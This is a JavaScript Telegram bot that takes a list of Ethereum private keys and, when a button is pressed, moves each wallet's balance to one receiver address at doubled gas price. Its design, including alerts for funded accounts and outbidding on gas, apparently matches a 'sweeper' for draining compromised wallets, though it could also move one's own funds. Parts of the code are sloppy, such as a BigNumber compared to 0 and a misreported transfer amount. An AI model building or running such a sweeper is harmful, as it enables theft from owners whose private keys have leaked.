require('dotenv').config()
const Telegraf = require('telegraf')
const ethers = require('ethers')

const bot = new Telegraf(process.env.TOKEN)
const provider = new ethers.providers.JsonRpcProvider(process.env.INFURA_URL)

const addressReceiver = "";
const privateKeys =
[""];


// /address /button
bot.command(['transfer', 'walletInfo', 'click', 'button', 'connect', 'address'], (ctx) => {
    bot.telegram.sendMessage(ctx.chat.id, `Welcome ${ctx.from.first_name}`,
    {
        reply_markup: {
            inline_keyboard: [
                [
                    {text: 'Address INFO', callback_data: 'clickButton'}
                ]
            
            ]
        }
    })
})

bot.action('clickButton', async (ctx) => {
    for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider);
        const balance = await provider.getBalance(target.address);
        const txBuffer = ethers.utils.parseEther(".001");
        const gasLimit = 21000;// default 21000
        const gasPrice = await provider.getGasPrice()
        ctx.reply(`Deposit wallet address: ${target.address}\nReceiver Address : ${addressReceiver}\nBalance: ${ethers.utils.formatEther(balance)}`)

        if (balance.sub(txBuffer) > 0) {
            ctx.reply("NEW ACCOUNT WITH ETH!");
            const amount = balance.sub(txBuffer);
            try {
              await target.sendTransaction({
                to: addressReceiver,
                value: amount,
                gasPrice: gasPrice * 2,
                gasLimit: gasLimit,
              });
              ctx.reply(`Success! transfered --> ${ethers.utils.formatEther(balance)}`);
            }
            catch (e) {
                console.log(`error: ${e}`);
            }
          }
    }
})


bot.launch()
